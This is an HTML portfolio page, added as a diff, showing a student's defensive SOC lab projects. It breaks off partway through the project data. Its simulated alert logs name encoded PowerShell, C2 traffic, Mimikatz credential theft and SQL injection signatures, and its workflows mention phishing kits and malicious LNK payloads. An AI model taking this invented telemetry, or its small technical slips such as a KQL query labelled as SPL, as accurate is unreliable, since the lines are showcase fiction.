@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sivananthan M. | Cybersecurity Project Vault</title>
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url("https://fonts.googleapis.com/css?family=Montserrat:400,500,700&display=swap");
+
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        obsidian: '#020617',
+                            accent: '#a855f7', // Violet-500
+                            secondary: '#3b82f6', // Blue-500
+                            highlight: '#f472b6', // Pink-400
+                            emeraldGlow: '#10b981', // Emerald-500
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                        'scan': 'scan 4s linear infinite',
+                        'matrix': 'matrix-fade 2.2s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        },
+                        scan: {
+                            '0%': { transform: 'translateY(-100%)' },
+                            '100%': { transform: 'translateY(600%)' },
+                        }
+                    }
+                }
+            }
+        }
+    </style>
+    <style>
+        body {
+            background-color: #020617;
+            color: #cbd5e1;
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #020617;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #4c1d95;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #a855f7;
+        }
+
+        /* Glassmorphic Cyber Cards */
+        .glass-card {
+            position: relative;
+            overflow: hidden;
+            border-radius: 0.75rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            background: rgba(2, 6, 23, 0.75);
+            backdrop-filter: blur(16px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .glass-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+            background: rgba(255, 255, 255, 0.03);
+            transform: translateY(-4px);
+            box-shadow: 0 15px 30px -10px rgba(168, 85, 247, 0.2);
+        }
+
+        /* Scanning Laser Bar */
+        .animate-scan {
+            animation: scan 5s linear infinite;
+        }
+
+        /* Tech Grid Background */
+        .bg-grid {
+            background-image: linear-gradient(to right, rgba(168, 85, 247, 0.05) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(168, 85, 247, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            mask-image: radial-gradient(ellipse at center, black, transparent 90%);
+        }
+
+        /* Terminal Cursor */
+        .cursor-blink::after {
+            content: '_';
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Custom Project Domain Tabs styling */
+        .active-tab {
+            background: rgba(168, 85, 247, 0.15);
+            border-color: rgba(168, 85, 247, 0.6);
+            color: #ffffff;
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.25);
+        }
+
+        /* Timeline Connection lines */
+        .flow-line::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 100%;
+            width: 2px;
+            height: 24px;
+            background: linear-gradient(to bottom, #a855f7, transparent);
+            transform: translateX(-50%);
+        }
+    </style>
+    </head>
+    <body class="selection:bg-violet-500/30">
+
+        <!-- Hex Backdrop Elements -->
+        <div class="fixed inset-0 z-[-1] bg-obsidian">
+            <div class="absolute inset-0 bg-grid opacity-45"></div>
+            <div class="absolute inset-0 bg-gradient-to-b from-transparent via-obsidian/40 to-obsidian"></div>
+        </div>
+
+        <!-- Navigation Header -->
+        <nav class="fixed top-0 left-0 right-0 z-50 border-b border-white/5 bg-obsidian/85 backdrop-blur-xl">
+            <div class="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
+                <div class="flex items-center gap-3 font-mono font-bold text-white group cursor-pointer" onclick="window.location.reload();">
+                    <div class="p-2.5 bg-violet-500/10 rounded-lg border border-violet-500/20 group-hover:border-violet-500/50 transition-all">
+                        <i data-lucide="shield-alert" class="text-violet-400 group-hover:rotate-12 transition-transform w-6 h-6 animate-pulse"></i>
+                    </div>
+                    <div class="flex flex-col">
+                        <span class="tracking-tighter text-lg leading-none">Sivananthan_M.</span>
+                        <span class="text-[9px] text-violet-400 font-normal uppercase tracking-widest">TACTICAL_PROJECTS_VAULT</span>
+                    </div>
+                </div>
+
+                <div class="hidden md:flex items-center gap-6 text-xs font-mono">
+                    <span class="text-slate-500">DECRYPT_LEVEL: 05</span>
+                    <span class="flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
+                        <span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+                        SECURE_UPLINK
+                    </span>
+                    <a href="index.html" class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white font-bold rounded-lg text-xs transition-all flex items-center gap-2 group shadow-[0_0_15px_rgba(168,85,247,0.3)]">
+                        <i data-lucide="user" class="w-3.5 h-3.5"></i> Back to Main Portfolio
+                    </a>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content Grid -->
+        <main class="max-w-7xl mx-auto px-6 pt-32 pb-20">
+
+            <!-- Interactive Control Dashboard Header -->
+            <header class="relative mb-12 p-8 glass-card border-violet-500/20 shadow-[0_0_50px_rgba(168,85,247,0.1)] rounded-2xl bg-slate-950/70 overflow-hidden">
+                <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-violet-500 to-transparent animate-scan"></div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+                    <div class="lg:col-span-7">
+                        <div class="mb-3 inline-block px-3 py-1 bg-violet-500/10 border border-violet-500/20 rounded text-[9px] font-mono text-violet-400 uppercase tracking-widest animate-pulse">
+                            Active System Inventory // SecOps Simulation Core
+                        </div>
+                        <h1 class="text-3xl md:text-5xl font-black text-white tracking-tight mb-4">
+                            Tethered <span class="text-transparent bg-clip-text bg-gradient-to-r from-violet-400 via-fuchsia-500 to-blue-500">Proofs of Work</span>
+                        </h1>
+                        <p class="text-slate-400 text-sm md:text-base leading-relaxed max-w-2xl">
+                            A comprehensively deployed lab infrastructure simulating production enterprise environments. Featuring automated SIEM ingestion, real-time threat hunting pipelines, interactive malware detonation networks, and multi-tenant security automation rules.
+                        </p>
+                    </div>
+
+                    <!-- Micro Live-Telemetry Display -->
+                    <div class="lg:col-span-5 grid grid-cols-2 md:grid-cols-3 gap-4 font-mono">
+                        <div class="p-4 bg-white/5 border border-white/5 rounded-xl text-center">
+                            <div class="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Completed Operations</div>
+                            <div class="text-3xl font-black text-violet-400" id="op-counter">10</div>
+                        </div>
+                        <div class="p-4 bg-white/5 border border-white/5 rounded-xl text-center">
+                            <div class="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Alert Threat Level</div>
+                            <div class="text-3xl font-black text-pink-400 animate-pulse">CRITICAL</div>
+                        </div>
+                        <div class="p-4 bg-white/5 border border-white/5 rounded-xl text-center col-span-2 md:col-span-1">
+                            <div class="text-[10px] text-slate-500 uppercase tracking-wider mb-1">System Health</div>
+                            <div class="text-3xl font-black text-emerald-400">100%</div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Project Filter and Dynamic View System -->
+            <section id="vault-core" class="mb-16">
+                <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-8 pb-4 border-b border-white/5">
+                    <!-- Sorting/Category Tabs -->
+                    <div class="flex flex-wrap gap-2.5 font-mono text-xs">
+                        <button onclick="filterProjects('all')" id="btn-all" class="px-4 py-2 rounded-lg border border-white/10 hover:border-violet-500/50 bg-white/5 text-slate-300 transition-all active-tab">
+                            [00] ALL_OPERATIONS
+                        </button>
+                        <button onclick="filterProjects('secops')" id="btn-secops" class="px-4 py-2 rounded-lg border border-white/10 hover:border-violet-500/50 bg-white/5 text-slate-300 transition-all">
+                            [01] SECOPS & SIEM
+                        </button>
+                        <button onclick="filterProjects('cloud')" id="btn-cloud" class="px-4 py-2 rounded-lg border border-white/10 hover:border-violet-500/50 bg-white/5 text-slate-300 transition-all">
+                            [02] CLOUD & ENDPOINT
+                        </button>
+                        <button onclick="filterProjects('automation')" id="btn-automation" class="px-4 py-2 rounded-lg border border-white/10 hover:border-violet-500/50 bg-white/5 text-slate-300 transition-all">
+                            [03] SOAR & THREAT INTEL
+                        </button>
+                    </div>
+
+                    <!-- Live Status Indicators -->
+                    <div class="flex items-center gap-3 text-xs font-mono">
+                        <span class="text-slate-500">Interactive Terminal Ready</span>
+                        <span class="h-2 w-2 rounded-full bg-emerald-400 shadow-[0_0_8px_#10b981]"></span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+
+                    <!-- Left: 10 Projects Dynamic Grid (Span 7) -->
+                    <div class="lg:col-span-7 space-y-4" id="projects-grid">
+                        <!-- Project cards will be populated programmatically with customized details -->
+                    </div>
+
+                    <!-- Right: Immersive Interactive HUD Tactical Terminal Simulator (Span 5) -->
+                    <div class="lg:col-span-5 lg:sticky lg:top-24 space-y-6">
+
+                        <div class="glass-card border-violet-500/30 overflow-hidden shadow-[0_10px_40px_rgba(168,85,247,0.1)] rounded-xl bg-slate-950/90 relative">
+                            <div class="p-4 bg-slate-900 border-b border-white/5 flex items-center justify-between font-mono">
+                                <div class="flex items-center gap-2">
+                                    <span class="w-3.5 h-3.5 rounded-full bg-red-500/70 inline-block"></span>
+                                    <span class="w-3.5 h-3.5 rounded-full bg-yellow-500/70 inline-block"></span>
+                                    <span class="w-3.5 h-3.5 rounded-full bg-green-500/70 inline-block"></span>
+                                    <span class="text-xs text-violet-400 font-bold ml-2">TACTICAL_TERMINAL.EXE</span>
+                                </div>
+                                <span class="text-[10px] text-slate-500">UPLINK_SECURE</span>
+                            </div>
+
+                            <!-- Simulated console display panel -->
+                            <div class="p-6 font-mono text-xs text-slate-300 bg-black min-h-[380px] max-h-[500px] overflow-y-auto space-y-4" id="terminal-screen">
+                                <div class="text-violet-400">[SYS] Ready for Command Injection...</div>
+                                <div class="text-slate-400">// Select a project to run live event simulations, execute log parsers, and view detection rules...</div>
+                                <div class="pt-6 flex justify-center flex-col items-center text-slate-500 py-12">
+                                    <i data-lucide="terminal" class="w-12 h-12 text-violet-500/30 animate-pulse mb-3"></i>
+                                    <span>Awaiting operational activation</span>
+                                </div>
+                            </div>
+
+                            <!-- Console control action deck -->
+                            <div class="p-4 bg-slate-900/80 border-t border-white/5 flex justify-between items-center font-mono">
+                                <div class="text-[10px] text-slate-400">ACTIVE: <span id="active-terminal-job" class="text-violet-400">NONE</span></div>
+                                <button onclick="clearTerminal()" class="text-xs px-3 py-1 bg-white/5 hover:bg-violet-500/20 rounded border border-white/10 transition-colors text-slate-300 hover:text-white flex items-center gap-1.5">
+                                    <i data-lucide="trash-2" class="w-3.5 h-3.5"></i> Clean Terminal
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Sandbox Tactical Brief -->
+                        <div class="glass-card p-6 border-blue-500/20">
+                            <h4 class="font-mono text-xs text-blue-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                                <i data-lucide="info" class="w-4 h-4"></i> Tactical Sandbox Manual
+                            </h4>
+                            <p class="text-xs text-slate-400 leading-relaxed mb-4">
+                                Click <strong class="text-violet-400">Launch Script</strong> on any project profile card to populate the tactical terminal screen with corresponding SOC event telemetry, live incident response traces, and detection signatures.
+                            </p>
+                            <div class="text-[11px] font-mono text-slate-500 border-l border-blue-500/30 pl-3 space-y-1">
+                                <div>• Auto-parsing: Sysmon XML Event IDs</div>
+                                <div>• Intel correlation: VirusTotal, AbuseIPDB</div>
+                                <div>• Target mapping: MITRE ATT&CK Matrix</div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+        </main>
+
+        <!-- Project Detail Multi-Layer HUD Modal (Modal Frame) -->
+        <div id="project-modal" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 sm:p-6 md:p-10 bg-black/85 backdrop-blur-md">
+            <div class="glass-card w-full max-w-4xl max-h-[90vh] overflow-y-auto bg-slate-950/95 border-violet-500/40 relative shadow-[0_0_50px_rgba(168,85,247,0.3)]" onclick="event.stopPropagation();">
+
+                <!-- Laser scanning line inside modal -->
+                <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-violet-400 to-transparent animate-scan"></div>
+
+                <!-- Modal Header -->
+                <div class="sticky top-0 bg-slate-950/95 border-b border-white/5 p-6 flex justify-between items-start z-10 backdrop-blur-md">
+                    <div class="flex items-start gap-4">
+                        <div class="p-3 bg-violet-500/10 rounded-xl border border-violet-500/20 text-violet-400 shrink-0" id="modal-icon-container">
+                            <i data-lucide="activity" class="w-8 h-8"></i>
+                        </div>
+                        <div>
+                            <div class="flex items-center gap-2 mb-1">
+                                <span class="font-mono text-[9px] px-2 py-0.5 bg-violet-500/25 text-violet-300 rounded" id="modal-category">SECOPS</span>
+                                <span class="font-mono text-[9px] text-slate-500" id="modal-id">REF: SEC-OP-01</span>
+                            </div>
+                            <h2 class="text-xl md:text-2xl font-black text-white" id="modal-title">Project Title</h2>
+                        </div>
+                    </div>
+                    <button onclick="closeProjectModal()" class="p-2 bg-white/5 hover:bg-red-500/20 hover:border-red-500/40 border border-white/10 rounded-lg text-slate-400 hover:text-white transition-all">
+                        <i data-lucide="x" class="w-5 h-5"></i>
+                    </button>
+                </div>
+
+                <!-- Modal Body Content -->
+                <div class="p-6 md:p-8 space-y-8">
+
+                    <!-- Detailed Overview -->
+                    <div>
+                        <h3 class="font-mono text-xs text-violet-400 uppercase tracking-wider mb-3 flex items-center gap-2">
+                            <i data-lucide="align-left" class="w-4 h-4"></i> Project Intelligence Overview
+                        </h3>
+                        <p class="text-slate-300 text-sm leading-relaxed" id="modal-description">Detailed descriptive text block.</p>
+                    </div>
+
+                    <!-- Workflow Lifecycle Phase Visualizer -->
+                    <div>
+                        <h3 class="font-mono text-xs text-blue-400 uppercase tracking-wider mb-4 flex items-center gap-2">
+                            <i data-lucide="git-branch" class="w-4 h-4"></i> Tactical Workflow Lifecycle
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4" id="modal-workflow-timeline">
+                            <!-- Workflow Steps generated dynamically -->
+                        </div>
+                    </div>
+
+                    <!-- Dual Layout split columns (Skills Gained & Arsenal tools) -->
+                    <div class="grid grid-cols-1 md:grid-cols-12 gap-8">
+                        <!-- Left: Skills Radar List (Span 7) -->
+                        <div class="md:col-span-7 space-y-4">
+                            <h3 class="font-mono text-xs text-emerald-400 uppercase tracking-wider mb-2 flex items-center gap-2">
+                                <i data-lucide="target" class="w-4 h-4"></i> Skills Acquired & Validated
+                            </h3>
+                            <div class="space-y-3" id="modal-skills">
+                                <!-- Skill bars populated dynamically -->
+                            </div>
+                        </div>
+
+                        <!-- Right: Threat Arsenal Stack (Span 5) -->
+                        <div class="md:col-span-5">
+                            <h3 class="font-mono text-xs text-pink-400 uppercase tracking-wider mb-4 flex items-center gap-2">
+                                <i data-lucide="tool" class="w-4 h-4"></i> Operational Security Arsenal
+                            </h3>
+                            <div class="space-y-2.5" id="modal-tools">
+                                <!-- Tools listing -->
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Modal Footer Controls -->
+                <div class="p-6 bg-slate-900 border-t border-white/5 flex flex-col sm:flex-row gap-4 items-center justify-between font-mono text-xs">
+                    <span class="text-slate-500 uppercase tracking-widest">TACTICAL STATUS: OPERATIONAL</span>
+                    <div class="flex gap-3">
+                        <button onclick="closeProjectModal()" class="px-5 py-2.5 border border-white/10 hover:border-white/20 bg-white/5 rounded-lg text-slate-300 hover:text-white transition-all">
+                            Secure Portals
+                        </button>
+                        <button id="modal-terminal-trigger" class="px-5 py-2.5 bg-violet-600 hover:bg-violet-500 text-white font-bold rounded-lg transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(168,85,247,0.3)]">
+                            <i data-lucide="terminal" class="w-4 h-4"></i> Ingress Terminal Logs
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Page Footer -->
+        <footer class="border-t border-white/5 bg-obsidian py-12 px-6">
+            <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6 font-mono text-xs text-slate-600 uppercase tracking-wider">
+                <span>&copy; 2026 sivananthan. All_rights_reserved.// NON-DISCLOSURE_ENFORCED</span>
+                <div class="flex gap-4">
+                    <span>LATENCY: 0.003ms</span>
+                    <span>NODE: SIEM_VAULT_PROD</span>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Interactive Logic Scripts -->
+        <script>
+            // Immersive Database containing the complete technical specs of all 10 Operations
+            const projectsData = [
+                {
+                    id: "SEC-OP-01",
+                    category: "secops",
+                    title: "SIEM Log Monitoring & Threat Detection",
+                    icon: "shield",
+                    colorClass: "border-l-violet-500",
+                    colorAccent: "text-violet-400",
+                    bgAccent: "bg-violet-500/10",
+                    description: "This project was completely implemented by me to simulate a real Security Operations Center (SOC) environment for centralized log monitoring, threat detection, and incident investigation. The purpose of this project was to understand how SOC analysts monitor security events, investigate alerts, create detection rules, and respond to suspicious activities in enterprise infrastructures.",
+                    workflow: [
+                        { title: "Lab Deployment", text: "Configure secure virtual networks using Windows and Linux virtual host environments." },
+                        { title: "SIEM Ingestion", text: "Deploy Splunk Free/ELK stack for centralized log parsing, parsing configuration, and ingestion." },
+                        { title: "Host Logging", text: "Configure sysmon logging framework alongside native authentication log streams." },
+                        { title: "Detection Logic", text: "Deploy custom parsing matrices, correlation rules, and alerts for suspicious processes." }
+                    ],
+                    skills: [
+                        { name: "SIEM Administration", val: 95 },
+                        { name: "Log Analysis", val: 92 },
+                        { name: "Detection Engineering", val: 88 },
+                        { name: "Incident Investigation", val: 90 },
+                        { name: "Correlation Rule Creation", val: 85 }
+                    ],
+                    tools: ["Splunk Free", "ELK Stack", "Sysmon", "Windows VM", "Linux VM"],
+                    terminalOutputs: [
+                        "[SYS] Launching Splunk Index Log Analyzer...",
+                        "[INFO] Core Ingestion configured: Windows Host-01 & Linux Host-02",
+                        "[LOG] INGESTED: Event ID 1 (ProcessCreate) - Target: cmd.exe spawning powershell.exe",
+                        "[RULE] MATCH: Encoded Command invocation spotted on Host-01",
+                        "[ALERT] CRITICAL - Possible brute-force attempt logged from 192.168.12.44",
+                        "[CORRELATION] 50 connection requests in < 5 seconds - Port 22 SSH",
+                        "[ACTION] Forwarded Alert telemetry to Incident Response queue."
+                    ]
+                },
+                {
+                    id: "SEC-OP-02",
+                    category: "secops",
+                    title: "Simulated Phishing Attack & Incident Response",
+                    icon: "mail-warning",
+                    colorClass: "border-l-blue-500",
+                    colorAccent: "text-blue-400",
+                    bgAccent: "bg-blue-500/10",
+                    description: "The project was fully implemented by me to simulate a phishing-based cyberattack and perform a complete incident response investigation. The purpose of the project was to understand how SOC analysts identify phishing attacks, investigate malware infections, analyze logs, and document incidents using real-world SOC methodologies.",
+                    workflow: [
+                        { title: "Phishing Setup", text: "Configure Social Engineering Toolkit (SET) to mimic banking portals and credential hubs." },
+                        { title: "Payload Assembly", text: "Deliver malicious LNK vectors and monitor payload handshakes inside Windows VMs." },
+                        { title: "Execution Tracking", text: "Audit Event IDs including 4688 to track suspicious system process spawning pathways." },
+                        { title: "Incident Reports", text: "Analyze network indicators of compromise (IOCs) and draft technical containment briefs." }
+                    ],
+                    skills: [
+                        { name: "Incident Response", val: 94 },
+                        { name: "Phishing Analysis", val: 90 },
+                        { name: "Malware Investigation", val: 88 },
+                        { name: "Windows Log Analysis", val: 92 },
+                        { name: "Evidence Collection", val: 87 }
+                    ],
+                    tools: ["Windows VM", "Kali Linux", "Sysinternals Suite", "Event Viewer", "SET Engine"],
+                    terminalOutputs: [
+                        "[IR_ENG] Deconstructing Phishing Delivery Vectors...",
+                        "[HEADER_ANALYSIS] Envelope-Sender: security@paypal-verification-portal.com (DMARC=FAIL)",
+                        "[SANDBOX] Container triggered. File Detonation execution logged...",
+                        "[LOG] Sysmon ID 1: powershell.exe executed with -nop -w hidden flags",
+                        "[ALERT] Malicious download payload triggered connection to C2: 185.11.44.29",
+                        "[IOC_EXTRACTED] Target Hash SHA-256: d4a24c9c7f8e810a9c... flagged positive.",
+                        "[REMEDIATION] Incident declared. Isolating host WIN-PC-01. Account disabled."
+                    ]
+                },
+                {
+                    id: "SEC-OP-03",
+                    category: "secops",
+                    title: "IDS Deployment & Packet Analysis",
+                    icon: "network",
+                    colorClass: "border-l-pink-500",
+                    colorAccent: "text-pink-400",
+                    bgAccent: "bg-pink-500/10",
+                    description: "The project was fully implemented by me to understand how Intrusion Detection Systems identify malicious network traffic and generate alerts for suspicious activities. The purpose of the project was to gain hands-on experience in network monitoring, intrusion detection, packet analysis, and attack investigation within SOC environments.",
+                    workflow: [
+                        { title: "Lab Setup", text: "Configure secure, isolated virtual network topologies using virtual switches." },
+                        { title: "IDS Deploy", text: "Install and configure Snort and Suricata sensor endpoints on router junctions." },
+                        { title: "Attack Run", text: "Simulate offensive scans (Nmap, SQL injection payloads, directory traversal attacks)." },
+                        { title: "Packet Audit", text: "Capture complete PCAP traces via Wireshark and tune custom Snort inspection rules." }
+                    ],
+                    skills: [
+                        { name: "IDS/IPS Monitoring", val: 93 },
+                        { name: "Packet Analysis", val: 91 },
+                        { name: "Network Security", val: 90 },
+                        { name: "Wireshark Analysis", val: 89 },
+                        { name: "IDS Rule Tuning", val: 85 }
+                    ],
+                    tools: ["Snort IDS", "Suricata Engine", "Wireshark PCAP", "Kali Linux", "Metasploitable"],
+                    terminalOutputs: [
+                        "[IDS] Snort IDS service starting up on interface enp0s3...",
+                        "[RULE] Loading community rule-sets: 42,000 active signatures.",
+                        "[DETECTION] Alert: Nmap scan detected! Target IP: 192.168.1.100",
+                        "[PACKET] Wireshark hook captured: TCP SYN flag set from host 192.168.1.50",
+                        "[ALERT] Suricata trigger: SQL Injection signature match: 'UNION SELECT' attempt.",
+                        "[TUNING] Adjusting signature alert weight to eliminate benign test environment warnings.",
+                        "[INFO] Generated PCAP analysis bundle for SOC Level 2 reporting."
+                    ]
+                },
+                {
+                    id: "SEC-OP-04",
+                    category: "cloud",
+                    title: "Cloud Security Monitoring with AWS/Azure Logs",
+                    icon: "cloud",
+                    colorClass: "border-l-violet-500",
+                    colorAccent: "text-violet-400",
+                    bgAccent: "bg-violet-500/10",
+                    description: "The project was fully implemented by me to understand cloud security monitoring, cloud threat detection, and investigation of suspicious activities in AWS and Azure environments. The purpose of the project was to simulate SOC operations for monitoring cloud infrastructures, identifying unauthorized access attempts, and analyzing cloud security events.",
+                    workflow: [
+                        { title: "Config Log Streams", text: "Configure secure AWS CloudTrail / Azure Defender integration scripts." },
+                        { title: "Enable Audit", text: "Initiate system auditing dashboards to track IAM API calls and resource activities." },
+                        { title: "Simulation Phase", text: "Simulate lateral privilege escalations, unauthorized bucket modification, and access." },
+                        { title: "SIEM Correlation", text: "Ingest cloud audit logs inside centralized dashboards for immediate visual analytics." }
+                    ],
+                    skills: [
+                        { name: "Cloud Security Monitoring", val: 92 },
+                        { name: "IAM Security Configuration", val: 88 },
+                        { name: "Cloud Log Analysis", val: 90 },
+                        { name: "Cloud Threat Detection", val: 89 },
+                        { name: "SIEM Ingestion Metrics", val: 86 }
+                    ],
+                    tools: ["AWS Free Tier", "CloudTrail", "AWS GuardDuty", "Azure Defender", "Splunk Engine"],
+                    terminalOutputs: [
+                        "[AWS] Connecting to secure AWS API cloud connector...",
+                        "[CLOUDTRAIL] Parsing events: PutBucketPolicy executed on bucket 'prod-financials'",
+                        "[ALERT] GuardDuty Alert: IAM user Alice-Assumed executed unauthorized credential creation.",
+                        "[LOG] Azure Security Center Flag: Non-compliant API connection to microservices.",
+                        "[ANALYSIS] Correlating user agent string: Tor exit node identified as source.",
+                        "[REMEDIATION] Dispatching AWS Lambda trigger to auto-terminate compromised IAM sessions."
+                    ]
+                },
+                {
+                    id: "SEC-OP-05",
+                    category: "cloud",
+                    title: "Endpoint Monitoring with Sysmon + Wazuh",
+                    icon: "shield-alert",
+                    colorClass: "border-l-blue-500",
+                    colorAccent: "text-blue-400",
+                    bgAccent: "bg-blue-500/10",
+                    description: "The project was fully implemented by me to understand endpoint security monitoring and host-based threat detection using Sysmon and Wazuh. The purpose of the project was to simulate endpoint detection and response (EDR) workflows commonly used in enterprise SOC environments.",
+                    workflow: [
+                        { title: "Endpoint Setup", text: "Install and configure system monitoring configuration maps on local agents." },
+                        { title: "Wazuh Deployment", text: "Install Wazuh telemetry sensors on production virtual machine configurations." },
+                        { title: "Simulate Attacks", text: "Simulate system exploits, local credential harvesting attempts, and registry persistence." },
+                        { title: "Tuning Controls", text: "Develop custom alert signatures and optimize Wazuh configs to suppress noise." }
+                    ],
+                    skills: [
+                        { name: "Endpoint Security Monitoring", val: 94 },
+                        { name: "Host-Based Detection", val: 91 },
+                        { name: "Sysmon Analysis Framework", val: 92 },
+                        { name: "Wazuh Administration", val: 89 },
+                        { name: "MITRE Mapping Methods", val: 87 }
+                    ],
+                    tools: ["Sysmon", "Wazuh Manager", "Windows Virtualization", "PowerShell Core"],
+                    terminalOutputs: [
+                        "[EDR] Wazuh Security Agent active on host WIN-CLIENT-02",
+                        "[SYSMON] Monitoring process access patterns on lsass.exe...",
+                        "[ALERT] Rule 100201: Mimikatz payload executed. Extracted access permissions.",
+                        "[LOG] Registry Key write triggered: CurrentVersion\\Run\\SpywareUpdater",
+                        "[MITRE] Mapping malicious activity profile to T1037 (Boot or Logon Initialization Helper)",
+                        "[ACTION] Active response initialized. Quarantine of WIN-CLIENT-02 executed successfully."
+                    ]
+                },
+                {
+                    id: "SEC-OP-06",
+                    category: "cloud",
+                    title: "Threat Hunting in Real Datasets",
+                    icon: "search",
+                    colorClass: "border-l-pink-500",
+                    colorAccent: "text-pink-400",
+                    bgAccent: "bg-pink-500/10",
+                    description: "The project was fully implemented by me to perform proactive threat hunting using real-world security datasets. The purpose of the project was to identify hidden malicious activities, analyze attacker behavior, and improve threat investigation capabilities using structured log analysis techniques.",
+                    workflow: [
+                        { title: "Dataset Ingress", text: "Import extensive Windows security audits and Zeek metadata datasets into Splunk." },
+                        { title: "Query Creation", text: "Develop complex SPL and KQL queries to isolate anomalous credential activities." },
+                        { title: "Timeline Analysis", text: "Analyze network traffic flows and timeline indicators to chart lateral migrations." },
+                        { title: "Framework Map", text: "Trace activity details to match advanced persistent threat tactics." }
+                    ],
+                    skills: [
+                        { name: "Threat Hunting Procedures", val: 93 },
+                        { name: "SPL/KQL Query Writing", val: 90 },
+                        { name: "Anomalous Log Correlation", val: 92 },
+                        { name: "Attack Timeline Mapping", val: 88 },
+                        { name: "Hypothesis Testing Method", val: 85 }
+                    ],
+                    tools: ["Splunk SIEM", "Elastic Stack", "CyberDefenders Repos", "Zeek Packet Logs"],
+                    terminalOutputs: [
+                        "[HUNT] Launching Splunk Index Search [index=threat_hunt_dataset]...",
+                        "[QUERY] Splunk SPL: SecurityEvent | where EventID == 4625 | summarize count() by TargetUserName",
+                        "[ANALYSIS] Finding: User account 'backup_service' has 5,400 failed logins in 10 minutes.",
+                        "[TIMELINE] 04:12:30 -> Lateral movement identified from workstation to database cluster.",
+                        "[IOC_MATCH] Spotted persistent connection outbound to dark-web node: 88.24.11.192",
+                        "[INFO] Hunt concluded. Flagged 3 compromised service nodes missed by traditional rules."
+                    ]
+                },
+                {
+                    id: "SEC-OP-07",
+                    category: "automation",
+                    title: "Security Automation Script (SOAR Lite)",
+                    icon: "code",
+                    colorClass: "border-l-violet-500",
+                    colorAccent: "text-violet-400",
+                    bgAccent: "bg-violet-500/10",
+                    description: "The project was fully implemented by me to automate repetitive SOC tasks using Python and PowerShell scripting. The purpose of the project was to improve incident response efficiency, automate IOC enrichment, and reduce manual SOC analyst workloads.",
+                    workflow: [
+                        { title: "Script Design", text: "Develop modular Python scripts designed to parse raw security events." },
+                        { title: "API Integrations", text: "Integrate VirusTotal API protocols alongside AbuseIPDB endpoint queries." },
+                        { title: "Enrich Alerts", text: "Configure automation flows to fetch real-time reputation and score datasets." },
+                        { title: "Export Reports", text: "Generate clean JSON summaries detailing threat levels and routing metrics." }
+                    ],
+                    skills: [
+                        { name: "Security Automation (SOAR)", val: 95 },
+                        { name: "Python Scripting Labs", val: 93 },
+                        { name: "PowerShell System Tools", val: 88 },
+                        { name: "Threat Intel Integration", val: 91 },
+                        { name: "API Ingress Optimization", val: 87 }
+                    ],
+                    tools: ["Python Engine", "PowerShell Core", "VirusTotal REST API", "AbuseIPDB Database", "Jira Automation"],
+                    terminalOutputs: [
+                        "[SOAR] SOAR-Lite automation pipeline listening on socket 8899...",
+                        "[PROCESSOR] Parsing alert payload... IP extracted: 103.21.244.11",
+                        "[VT_API] Querying hash: 4a331be9... Result: 58/70 malicious detections",
+                        "[ABUSE_IP] Querying reputation tracker... Result: Abuse Score 100% (Spam Botnet)",
+                        "[ENRICHMENT] Packaging incident metadata variables into structured JSON schemas...",
+                        "[ACTION] Creating high-priority triage incident ticket #IR-8821 in Jira.",
